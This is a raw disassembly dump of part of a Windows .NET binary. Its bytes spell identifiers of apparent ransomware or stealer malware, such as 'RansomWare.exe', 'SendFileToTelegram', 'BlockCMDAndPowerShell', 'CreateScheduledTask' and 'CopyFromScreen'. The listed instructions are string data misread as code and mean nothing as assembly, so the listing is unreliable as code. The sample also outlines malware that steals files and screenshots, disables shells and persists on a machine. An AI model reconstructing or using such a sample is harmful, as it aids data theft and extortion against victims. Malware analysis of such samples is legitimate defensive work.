  4058a2:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4058a6:	6d                   	insl   (%dx),%es:(%edi)
  4058a7:	56                   	push   %esi
  4058a8:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4058af:	74 74                	je     0x405925
  4058b1:	72 69                	jb     0x40591c
  4058b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4058b6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4058ba:	73 65                	jae    0x405921
  4058bc:	6d                   	insl   (%dx),%es:(%edi)
  4058bd:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4058c1:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4058c8:	72 
  4058c9:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4058d0:	73 73                	jae    0x405945
  4058d2:	65 6d                	gs insl (%dx),%es:(%edi)
  4058d4:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4058d8:	72 61                	jb     0x40593b
  4058da:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4058dd:	61                   	popa
  4058de:	72 6b                	jb     0x40594b
  4058e0:	41                   	inc    %ecx
  4058e1:	74 74                	je     0x405957
  4058e3:	72 69                	jb     0x40594e
  4058e5:	62 75 74             	bound  %esi,0x74(%ebp)
  4058e8:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4058ed:	67 65 74 46          	addr16 gs je 0x405937
  4058f1:	72 61                	jb     0x405954
  4058f3:	6d                   	insl   (%dx),%es:(%edi)
  4058f4:	65 77 6f             	gs ja  0x405966
  4058f7:	72 6b                	jb     0x405964
  4058f9:	41                   	inc    %ecx
  4058fa:	74 74                	je     0x405970
  4058fc:	72 69                	jb     0x405967
  4058fe:	62 75 74             	bound  %esi,0x74(%ebp)
  405901:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  405906:	75 67                	jne    0x40596f
  405908:	67 65 72 48          	addr16 gs jb 0x405954
  40590c:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  405913:	74 
  405914:	72 69                	jb     0x40597f
  405916:	62 75 74             	bound  %esi,0x74(%ebp)
  405919:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40591d:	73 65                	jae    0x405984
  40591f:	6d                   	insl   (%dx),%es:(%edi)
  405920:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  405924:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40592b:	69 
  40592c:	6f                   	outsl  %ds:(%esi),(%dx)
  40592d:	6e                   	outsb  %ds:(%esi),(%dx)
  40592e:	41                   	inc    %ecx
  40592f:	74 74                	je     0x4059a5
  405931:	72 69                	jb     0x40599c
  405933:	62 75 74             	bound  %esi,0x74(%ebp)
  405936:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40593a:	73 65                	jae    0x4059a1
  40593c:	6d                   	insl   (%dx),%es:(%edi)
  40593d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  405941:	6f                   	outsl  %ds:(%esi),(%dx)
  405942:	6e                   	outsb  %ds:(%esi),(%dx)
  405943:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  405949:	74 69                	je     0x4059b4
  40594b:	6f                   	outsl  %ds:(%esi),(%dx)
  40594c:	6e                   	outsb  %ds:(%esi),(%dx)
  40594d:	41                   	inc    %ecx
  40594e:	74 74                	je     0x4059c4
  405950:	72 69                	jb     0x4059bb
  405952:	62 75 74             	bound  %esi,0x74(%ebp)
  405955:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  405959:	73 65                	jae    0x4059c0
  40595b:	6d                   	insl   (%dx),%es:(%edi)
  40595c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  405960:	65 73 63             	gs jae 0x4059c6
  405963:	72 69                	jb     0x4059ce
  405965:	70 74                	jo     0x4059db
  405967:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40596e:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  405975:	6f                   	outsl  %ds:(%esi),(%dx)
  405976:	6d                   	insl   (%dx),%es:(%edi)
  405977:	70 69                	jo     0x4059e2
  405979:	6c                   	insb   (%dx),%es:(%edi)
  40597a:	61                   	popa
  40597b:	74 69                	je     0x4059e6
  40597d:	6f                   	outsl  %ds:(%esi),(%dx)
  40597e:	6e                   	outsb  %ds:(%esi),(%dx)
  40597f:	52                   	push   %edx
  405980:	65 6c                	gs insb (%dx),%es:(%edi)
  405982:	61                   	popa
  405983:	78 61                	js     0x4059e6
  405985:	74 69                	je     0x4059f0
  405987:	6f                   	outsl  %ds:(%esi),(%dx)
  405988:	6e                   	outsb  %ds:(%esi),(%dx)
  405989:	73 41                	jae    0x4059cc
  40598b:	74 74                	je     0x405a01
  40598d:	72 69                	jb     0x4059f8
  40598f:	62 75 74             	bound  %esi,0x74(%ebp)
  405992:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  405996:	73 65                	jae    0x4059fd
  405998:	6d                   	insl   (%dx),%es:(%edi)
  405999:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40599d:	72 6f                	jb     0x405a0e
  40599f:	64 75 63             	fs jne 0x405a05
  4059a2:	74 41                	je     0x4059e5
  4059a4:	74 74                	je     0x405a1a
  4059a6:	72 69                	jb     0x405a11
  4059a8:	62 75 74             	bound  %esi,0x74(%ebp)
  4059ab:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4059af:	73 65                	jae    0x405a16
  4059b1:	6d                   	insl   (%dx),%es:(%edi)
  4059b2:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4059b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b7:	70 79                	jo     0x405a32
  4059b9:	72 69                	jb     0x405a24
  4059bb:	67 68 74 41 74 74    	addr16 push $0x74744174
  4059c1:	72 69                	jb     0x405a2c
  4059c3:	62 75 74             	bound  %esi,0x74(%ebp)
  4059c6:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4059cb:	75 67                	jne    0x405a34
  4059cd:	67 65 72 44          	addr16 gs jb 0x405a15
  4059d1:	69 73 70 6c 61 79 41 	imul   $0x4179616c,0x70(%ebx),%esi
  4059d8:	74 74                	je     0x405a4e
  4059da:	72 69                	jb     0x405a45
  4059dc:	62 75 74             	bound  %esi,0x74(%ebp)
  4059df:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4059e3:	73 65                	jae    0x405a4a
  4059e5:	6d                   	insl   (%dx),%es:(%edi)
  4059e6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4059ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4059eb:	6d                   	insl   (%dx),%es:(%edi)
  4059ec:	70 61                	jo     0x405a4f
  4059ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4059ef:	79 41                	jns    0x405a32
  4059f1:	74 74                	je     0x405a67
  4059f3:	72 69                	jb     0x405a5e
  4059f5:	62 75 74             	bound  %esi,0x74(%ebp)
  4059f8:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4059fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4059fd:	74 69                	je     0x405a68
  4059ff:	6d                   	insl   (%dx),%es:(%edi)
  405a00:	65 43                	gs inc %ebx
  405a02:	6f                   	outsl  %ds:(%esi),(%dx)
  405a03:	6d                   	insl   (%dx),%es:(%edi)
  405a04:	70 61                	jo     0x405a67
  405a06:	74 69                	je     0x405a71
  405a08:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  405a0b:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  405a12:	69 
  405a13:	62 75 74             	bound  %esi,0x74(%ebp)
  405a16:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405a1a:	74 5f                	je     0x405a7b
  405a1c:	55                   	push   %ebp
  405a1d:	73 65                	jae    0x405a84
  405a1f:	53                   	push   %ebx
  405a20:	68 65 6c 6c 45       	push   $0x456c6c65
  405a25:	78 65                	js     0x405a8c
  405a27:	63 75 74             	arpl   %esi,0x74(%ebp)
  405a2a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405a2e:	74 56                	je     0x405a86
  405a30:	61                   	popa
  405a31:	6c                   	insb   (%dx),%es:(%edi)
  405a32:	75 65                	jne    0x405a99
  405a34:	00 53 65             	add    %dl,0x65(%ebx)
  405a37:	74 56                	je     0x405a8f
  405a39:	61                   	popa
  405a3a:	6c                   	insb   (%dx),%es:(%edi)
  405a3b:	75 65                	jne    0x405aa2
  405a3d:	00 76 61             	add    %dh,0x61(%esi)
  405a40:	6c                   	insb   (%dx),%es:(%edi)
  405a41:	75 65                	jne    0x405aa8
  405a43:	00 53 61             	add    %dl,0x61(%ebx)
  405a46:	76 65                	jbe    0x405aad
  405a48:	00 52 61             	add    %dl,0x61(%edx)
  405a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  405a4c:	73 6f                	jae    0x405abd
  405a4e:	6d                   	insl   (%dx),%es:(%edi)
  405a4f:	57                   	push   %edi
  405a50:	61                   	popa
  405a51:	72 65                	jb     0x405ab8
  405a53:	2e 65 78 65          	cs js,pn 0x405abc
  405a57:	00 67 65             	add    %ah,0x65(%edi)
  405a5a:	74 5f                	je     0x405abb
  405a5c:	53                   	push   %ebx
  405a5d:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  405a64:	5f                   	pop    %edi
  405a65:	4a                   	dec    %edx
  405a66:	70 65                	jo     0x405acd
  405a68:	67 00 67 65          	add    %ah,0x65(%bx)
  405a6c:	74 5f                	je     0x405acd
  405a6e:	50                   	push   %eax
  405a6f:	6e                   	outsb  %ds:(%esi),(%dx)
  405a70:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  405a74:	73 74                	jae    0x405aea
  405a76:	65 6d                	gs insl (%dx),%es:(%edi)
  405a78:	2e 54                	cs push %esp
  405a7a:	68 72 65 61 64       	push   $0x64616572
  405a7f:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  405a86:	6f                   	outsl  %ds:(%esi),(%dx)
  405a87:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
  405a8e:	73 
  405a8f:	74 65                	je     0x405af6
  405a91:	6d                   	insl   (%dx),%es:(%edi)
  405a92:	2e 44                	cs inc %esp
  405a94:	72 61                	jb     0x405af7
  405a96:	77 69                	ja     0x405b01
  405a98:	6e                   	outsb  %ds:(%esi),(%dx)
  405a99:	67 2e 49             	addr16 cs dec %ecx
  405a9c:	6d                   	insl   (%dx),%es:(%edi)
  405a9d:	61                   	popa
  405a9e:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  405aa5:	73 
  405aa6:	74 65                	je     0x405b0d
  405aa8:	6d                   	insl   (%dx),%es:(%edi)
  405aa9:	2e 52                	cs push %edx
  405aab:	75 6e                	jne    0x405b1b
  405aad:	74 69                	je     0x405b18
  405aaf:	6d                   	insl   (%dx),%es:(%edi)
  405ab0:	65 2e 56             	gs cs push %esi
  405ab3:	65 72 73             	gs jb  0x405b29
  405ab6:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  405abd:	44                   	inc    %esp
  405abe:	6f                   	outsl  %ds:(%esi),(%dx)
  405abf:	77 6e                	ja     0x405b2f
  405ac1:	6c                   	insb   (%dx),%es:(%edi)
  405ac2:	6f                   	outsl  %ds:(%esi),(%dx)
  405ac3:	61                   	popa
  405ac4:	64 53                	fs push %ebx
  405ac6:	74 72                	je     0x405b3a
  405ac8:	69 6e 67 00 47 65 6e 	imul   $0x6e654700,0x67(%esi),%ebp
  405acf:	65 72 61             	gs jb  0x405b33
  405ad2:	74 65                	je     0x405b39
  405ad4:	52                   	push   %edx
  405ad5:	61                   	popa
  405ad6:	6e                   	outsb  %ds:(%esi),(%dx)
  405ad7:	64 6f                	outsl  %fs:(%esi),(%dx)
  405ad9:	6d                   	insl   (%dx),%es:(%edi)
  405ada:	53                   	push   %ebx
  405adb:	74 72                	je     0x405b4f
  405add:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  405ae4:	74 72                	je     0x405b58
  405ae6:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  405aed:	74 65                	je     0x405b54
  405aef:	6d                   	insl   (%dx),%es:(%edi)
  405af0:	2e 44                	cs inc %esp
  405af2:	72 61                	jb     0x405b55
  405af4:	77 69                	ja     0x405b5f
  405af6:	6e                   	outsb  %ds:(%esi),(%dx)
  405af7:	67 00 53 68          	add    %dl,0x68(%bp,%di)
  405afb:	6f                   	outsl  %ds:(%esi),(%dx)
  405afc:	77 44                	ja     0x405b42
  405afe:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  405b05:	65 74 5f             	gs je  0x405b67
  405b08:	45                   	inc    %ebp
  405b09:	78 65                	js     0x405b70
  405b0b:	63 75 74             	arpl   %esi,0x74(%ebp)
  405b0e:	61                   	popa
  405b0f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  405b13:	61                   	popa
  405b14:	74 68                	je     0x405b7e
  405b16:	00 66 69             	add    %ah,0x69(%esi)
  405b19:	6c                   	insb   (%dx),%es:(%edi)
  405b1a:	65 50                	gs push %eax
  405b1c:	61                   	popa
  405b1d:	74 68                	je     0x405b87
  405b1f:	00 63 75             	add    %ah,0x75(%ebx)
  405b22:	72 72                	jb     0x405b96
  405b24:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b26:	74 45                	je     0x405b6d
  405b28:	78 65                	js     0x405b8f
  405b2a:	50                   	push   %eax
  405b2b:	61                   	popa
  405b2c:	74 68                	je     0x405b96
  405b2e:	00 47 65             	add    %al,0x65(%edi)
  405b31:	74 54                	je     0x405b87
  405b33:	65 6d                	gs insl (%dx),%es:(%edi)
  405b35:	70 50                	jo     0x405b87
  405b37:	61                   	popa
  405b38:	74 68                	je     0x405ba2
  405b3a:	00 47 65             	add    %al,0x65(%edi)
  405b3d:	74 46                	je     0x405b85
  405b3f:	6f                   	outsl  %ds:(%esi),(%dx)
  405b40:	6c                   	insb   (%dx),%es:(%edi)
  405b41:	64 65 72 50          	fs gs jb 0x405b95
  405b45:	61                   	popa
  405b46:	74 68                	je     0x405bb0
  405b48:	00 66 6f             	add    %ah,0x6f(%esi)
  405b4b:	6c                   	insb   (%dx),%es:(%edi)
  405b4c:	64 65 72 50          	fs gs jb 0x405ba0
  405b50:	61                   	popa
  405b51:	74 68                	je     0x405bbb
  405b53:	00 73 63             	add    %dh,0x63(%ebx)
  405b56:	72 69                	jb     0x405bc1
  405b58:	70 74                	jo     0x405bce
  405b5a:	50                   	push   %eax
  405b5b:	61                   	popa
  405b5c:	74 68                	je     0x405bc6
  405b5e:	00 67 65             	add    %ah,0x65(%edi)
  405b61:	74 5f                	je     0x405bc2
  405b63:	57                   	push   %edi
  405b64:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  405b6b:	74 
  405b6c:	5f                   	pop    %edi
  405b6d:	4c                   	dec    %esp
  405b6e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b70:	67 74 68             	addr16 je 0x405bdb
  405b73:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  405b77:	67 74 68             	addr16 je 0x405be2
  405b7a:	00 66 57             	add    %ah,0x57(%esi)
  405b7d:	69 6e 49 6e 69 00 67 	imul   $0x6700696e,0x49(%esi),%ebp
  405b84:	65 74 5f             	gs je  0x405be6
  405b87:	42                   	inc    %edx
  405b88:	6c                   	insb   (%dx),%es:(%edi)
  405b89:	61                   	popa
  405b8a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  405b8d:	73 65                	jae    0x405bf4
  405b8f:	74 5f                	je     0x405bf0
  405b91:	44                   	inc    %esp
  405b92:	6f                   	outsl  %ds:(%esi),(%dx)
  405b93:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  405b96:	44                   	inc    %esp
  405b97:	6f                   	outsl  %ds:(%esi),(%dx)
  405b98:	46                   	inc    %esi
  405b99:	75 6c                	jne    0x405c07
  405b9b:	6c                   	insb   (%dx),%es:(%edi)
  405b9c:	42                   	inc    %edx
  405b9d:	6c                   	insb   (%dx),%es:(%edi)
  405b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  405b9f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  405ba2:	43                   	inc    %ebx
  405ba3:	72 65                	jb     0x405c0a
  405ba5:	61                   	popa
  405ba6:	74 65                	je     0x405c0d
  405ba8:	53                   	push   %ebx
  405ba9:	63 68 65             	arpl   %ebp,0x65(%eax)
  405bac:	64 75 6c             	fs jne 0x405c1b
  405baf:	65 64 54             	gs fs push %esp
  405bb2:	61                   	popa
  405bb3:	73 6b                	jae    0x405c20
  405bb5:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  405bb9:	65 6c                	gs insb (%dx),%es:(%edi)
  405bbb:	00 53 79             	add    %dl,0x79(%ebx)
  405bbe:	73 74                	jae    0x405c34
  405bc0:	65 6d                	gs insl (%dx),%es:(%edi)
  405bc2:	2e 43                	cs inc %ebx
  405bc4:	6f                   	outsl  %ds:(%esi),(%dx)
  405bc5:	6d                   	insl   (%dx),%es:(%edi)
  405bc6:	70 6f                	jo     0x405c37
  405bc8:	6e                   	outsb  %ds:(%esi),(%dx)
  405bc9:	65 6e                	outsb  %gs:(%esi),(%dx)
  405bcb:	74 4d                	je     0x405c1a
  405bcd:	6f                   	outsl  %ds:(%esi),(%dx)
  405bce:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  405bd1:	00 42 6c             	add    %al,0x6c(%edx)
  405bd4:	6f                   	outsl  %ds:(%esi),(%dx)
  405bd5:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  405bd8:	6f                   	outsl  %ds:(%esi),(%dx)
  405bd9:	66 74 77             	data16 je 0x405c53
  405bdc:	61                   	popa
  405bdd:	72 65                	jb     0x405c44
  405bdf:	49                   	dec    %ecx
  405be0:	6e                   	outsb  %ds:(%esi),(%dx)
  405be1:	73 74                	jae    0x405c57
  405be3:	61                   	popa
  405be4:	6c                   	insb   (%dx),%es:(%edi)
  405be5:	6c                   	insb   (%dx),%es:(%edi)
  405be6:	00 6b 65             	add    %ch,0x65(%ebx)
  405be9:	72 6e                	jb     0x405c59
  405beb:	65 6c                	gs insb (%dx),%es:(%edi)
  405bed:	33 32                	xor    (%edx),%esi
  405bef:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405bf2:	6c                   	insb   (%dx),%es:(%edi)
  405bf3:	00 75 73             	add    %dh,0x73(%ebp)
  405bf6:	65 72 33             	gs jb  0x405c2c
  405bf9:	32 2e                	xor    (%esi),%ch
  405bfb:	64 6c                	fs insb (%dx),%es:(%edi)
  405bfd:	6c                   	insb   (%dx),%es:(%edi)
  405bfe:	00 42 6c             	add    %al,0x6c(%edx)
  405c01:	6f                   	outsl  %ds:(%esi),(%dx)
  405c02:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  405c05:	4d                   	dec    %ebp
  405c06:	44                   	inc    %esp
  405c07:	41                   	inc    %ecx
  405c08:	6e                   	outsb  %ds:(%esi),(%dx)
  405c09:	64 50                	fs push %eax
  405c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  405c0c:	77 65                	ja     0x405c73
  405c0e:	72 53                	jb     0x405c63
  405c10:	68 65 6c 6c 00       	push   $0x6c6c65
  405c15:	4b                   	dec    %ebx
  405c16:	69 6c 6c 00 43 6f 6e 	imul   $0x746e6f43,0x0(%esp,%ebp,2),%ebp
  405c1d:	74 
  405c1e:	72 6f                	jb     0x405c8f
  405c20:	6c                   	insb   (%dx),%es:(%edi)
  405c21:	00 4d 65             	add    %cl,0x65(%ebp)
  405c24:	6d                   	insl   (%dx),%es:(%edi)
  405c25:	6f                   	outsl  %ds:(%esi),(%dx)
  405c26:	72 79                	jb     0x405ca1
  405c28:	53                   	push   %ebx
  405c29:	74 72                	je     0x405c9d
  405c2b:	65 61                	gs popa
  405c2d:	6d                   	insl   (%dx),%es:(%edi)
  405c2e:	00 75 69             	add    %dh,0x69(%ebp)
  405c31:	50                   	push   %eax
  405c32:	61                   	popa
  405c33:	72 61                	jb     0x405c96
  405c35:	6d                   	insl   (%dx),%es:(%edi)
  405c36:	00 70 76             	add    %dh,0x76(%eax)
  405c39:	50                   	push   %eax
  405c3a:	61                   	popa
  405c3b:	72 61                	jb     0x405c9e
  405c3d:	6d                   	insl   (%dx),%es:(%edi)
  405c3e:	00 53 65             	add    %dl,0x65(%ebx)
  405c41:	6e                   	outsb  %ds:(%esi),(%dx)
  405c42:	64 54                	fs push %esp
  405c44:	6f                   	outsl  %ds:(%esi),(%dx)
  405c45:	54                   	push   %esp
  405c46:	65 6c                	gs insb (%dx),%es:(%edi)
  405c48:	65 67 72 61          	gs addr16 jb 0x405cad
  405c4c:	6d                   	insl   (%dx),%es:(%edi)
  405c4d:	00 53 65             	add    %dl,0x65(%ebx)
  405c50:	6e                   	outsb  %ds:(%esi),(%dx)
  405c51:	64 46                	fs inc %esi
  405c53:	69 6c 65 54 6f 54 65 	imul   $0x6c65546f,0x54(%ebp,%eiz,2),%ebp
  405c5a:	6c 
  405c5b:	65 67 72 61          	gs addr16 jb 0x405cc0
  405c5f:	6d                   	insl   (%dx),%es:(%edi)
  405c60:	00 50 72             	add    %dl,0x72(%eax)
  405c63:	6f                   	outsl  %ds:(%esi),(%dx)
  405c64:	67 72 61             	addr16 jb 0x405cc8
  405c67:	6d                   	insl   (%dx),%es:(%edi)
  405c68:	00 73 65             	add    %dh,0x65(%ebx)
  405c6b:	74 5f                	je     0x405ccc
  405c6d:	49                   	dec    %ecx
  405c6e:	74 65                	je     0x405cd5
  405c70:	6d                   	insl   (%dx),%es:(%edi)
  405c71:	00 4f 70             	add    %cl,0x70(%edi)
  405c74:	65 72 61             	gs jb  0x405cd8
  405c77:	74 69                	je     0x405ce2
  405c79:	6e                   	outsb  %ds:(%esi),(%dx)
  405c7a:	67 53                	addr16 push %ebx
  405c7c:	79 73                	jns    0x405cf1
  405c7e:	74 65                	je     0x405ce5
  405c80:	6d                   	insl   (%dx),%es:(%edi)
  405c81:	00 52 65             	add    %dl,0x65(%edx)
  405c84:	73 74                	jae    0x405cfa
  405c86:	61                   	popa
  405c87:	72 74                	jb     0x405cfd
  405c89:	53                   	push   %ebx
  405c8a:	79 73                	jns    0x405cff
  405c8c:	74 65                	je     0x405cf3
  405c8e:	6d                   	insl   (%dx),%es:(%edi)
  405c8f:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  405c93:	6d                   	insl   (%dx),%es:(%edi)
  405c94:	00 52 61             	add    %dl,0x61(%edx)
  405c97:	6e                   	outsb  %ds:(%esi),(%dx)
  405c98:	64 6f                	outsl  %fs:(%esi),(%dx)
  405c9a:	6d                   	insl   (%dx),%es:(%edi)
  405c9b:	00 46 6f             	add    %al,0x6f(%esi)
  405c9e:	72 6d                	jb     0x405d0d
  405ca0:	00 72 65             	add    %dh,0x65(%edx)
  405ca3:	73 6f                	jae    0x405d14
  405ca5:	75 72                	jne    0x405d19
  405ca7:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  405caa:	61                   	popa
  405cab:	6e                   	outsb  %ds:(%esi),(%dx)
  405cac:	00 43 6f             	add    %al,0x6f(%ebx)
  405caf:	70 79                	jo     0x405d2a
  405cb1:	46                   	inc    %esi
  405cb2:	72 6f                	jb     0x405d23
  405cb4:	6d                   	insl   (%dx),%es:(%edi)
  405cb5:	53                   	push   %ebx
  405cb6:	63 72 65             	arpl   %esi,0x65(%edx)
  405cb9:	65 6e                	outsb  %gs:(%esi),(%dx)
  405cbb:	00 67 65             	add    %ah,0x65(%edi)
  405cbe:	74 5f                	je     0x405d1f
  405cc0:	50                   	push   %eax
  405cc1:	72 69                	jb     0x405d2c
  405cc3:	6d                   	insl   (%dx),%es:(%edi)
  405cc4:	61                   	popa
  405cc5:	72 79                	jb     0x405d40
  405cc7:	53                   	push   %ebx
  405cc8:	63 72 65             	arpl   %esi,0x65(%edx)
  405ccb:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ccd:	00 73 65             	add    %dh,0x65(%ebx)
  405cd0:	74 5f                	je     0x405d31
  405cd2:	54                   	push   %esp
  405cd3:	65 78 74             	gs js  0x405d4a
  405cd6:	41                   	inc    %ecx
  405cd7:	6c                   	insb   (%dx),%es:(%edi)
  405cd8:	69 67 6e 00 4d 61 69 	imul   $0x69614d00,0x6e(%edi),%esp
  405cdf:	6e                   	outsb  %ds:(%esi),(%dx)
  405ce0:	00 67 65             	add    %ah,0x65(%edi)
  405ce3:	74 5f                	je     0x405d44
  405ce5:	4f                   	dec    %edi
  405ce6:	53                   	push   %ebx
  405ce7:	56                   	push   %esi
  405ce8:	65 72 73             	gs jb  0x405d5e
  405ceb:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  405cf2:	6c                   	insb   (%dx),%es:(%edi)
  405cf3:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  405cfa:	00 53 79             	add    %dl,0x79(%ebx)
  405cfd:	73 74                	jae    0x405d73
  405cff:	65 6d                	gs insl (%dx),%es:(%edi)
  405d01:	2e 43                	cs inc %ebx
  405d03:	6f                   	outsl  %ds:(%esi),(%dx)
  405d04:	6e                   	outsb  %ds:(%esi),(%dx)
  405d05:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  405d0b:	74 69                	je     0x405d76
  405d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  405d0e:	6e                   	outsb  %ds:(%esi),(%dx)
  405d0f:	00 53 79             	add    %dl,0x79(%ebx)
  405d12:	73 74                	jae    0x405d88
  405d14:	65 6d                	gs insl (%dx),%es:(%edi)
  405d16:	2e 47                	cs inc %edi
  405d18:	6c                   	insb   (%dx),%es:(%edi)
  405d19:	6f                   	outsl  %ds:(%esi),(%dx)
  405d1a:	62 61 6c             	bound  %esp,0x6c(%ecx)
  405d1d:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  405d24:	00 75 69             	add    %dh,0x69(%ebp)
  405d27:	41                   	inc    %ecx
  405d28:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  405d2c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d2d:	00 53 79             	add    %dl,0x79(%ebx)
  405d30:	73 74                	jae    0x405da6
  405d32:	65 6d                	gs insl (%dx),%es:(%edi)
  405d34:	2e 52                	cs push %edx
  405d36:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  405d39:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405d3e:	6e                   	outsb  %ds:(%esi),(%dx)
  405d3f:	00 43 6f             	add    %al,0x6f(%ebx)
  405d42:	6e                   	outsb  %ds:(%esi),(%dx)
  405d43:	74 72                	je     0x405db7
  405d45:	6f                   	outsl  %ds:(%esi),(%dx)
  405d46:	6c                   	insb   (%dx),%es:(%edi)
  405d47:	43                   	inc    %ebx
  405d48:	6f                   	outsl  %ds:(%esi),(%dx)
  405d49:	6c                   	insb   (%dx),%es:(%edi)
  405d4a:	6c                   	insb   (%dx),%es:(%edi)
  405d4b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405d50:	6e                   	outsb  %ds:(%esi),(%dx)
  405d51:	00 57 65             	add    %dl,0x65(%edi)
  405d54:	62 48 65             	bound  %ecx,0x65(%eax)
  405d57:	61                   	popa
  405d58:	64 65 72 43          	fs gs jb 0x405d9f
  405d5c:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5d:	6c                   	insb   (%dx),%es:(%edi)
  405d5e:	6c                   	insb   (%dx),%es:(%edi)
  405d5f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405d64:	6e                   	outsb  %ds:(%esi),(%dx)
  405d65:	00 45 78             	add    %al,0x78(%ebp)
  405d68:	63 65 70             	arpl   %esp,0x70(%ebp)
  405d6b:	74 69                	je     0x405dd6
  405d6d:	6f                   	outsl  %ds:(%esi),(%dx)
  405d6e:	6e                   	outsb  %ds:(%esi),(%dx)
  405d6f:	00 43 68             	add    %al,0x68(%ebx)
  405d72:	65 63 6b 46          	arpl   %ebp,%gs:0x46(%ebx)
  405d76:	69 72 73 74 52 75 6e 	imul   $0x6e755274,0x73(%edx),%esi
  405d7d:	00 44 6f 46          	add    %al,0x46(%edi,%ebp,2)
  405d81:	69 72 73 74 52 75 6e 	imul   $0x6e755274,0x73(%edx),%esi
  405d88:	00 43 75             	add    %al,0x75(%ebx)
  405d8b:	6c                   	insb   (%dx),%es:(%edi)
  405d8c:	74 75                	je     0x405e03
  405d8e:	72 65                	jb     0x405df5
  405d90:	49                   	dec    %ecx
  405d91:	6e                   	outsb  %ds:(%esi),(%dx)
  405d92:	66 6f                	outsw  %ds:(%esi),(%dx)
  405d94:	00 53 65             	add    %dl,0x65(%ebx)
  405d97:	6e                   	outsb  %ds:(%esi),(%dx)
  405d98:	64 53                	fs push %ebx
  405d9a:	79 73                	jns    0x405e0f
  405d9c:	74 65                	je     0x405e03
  405d9e:	6d                   	insl   (%dx),%es:(%edi)
  405d9f:	49                   	dec    %ecx
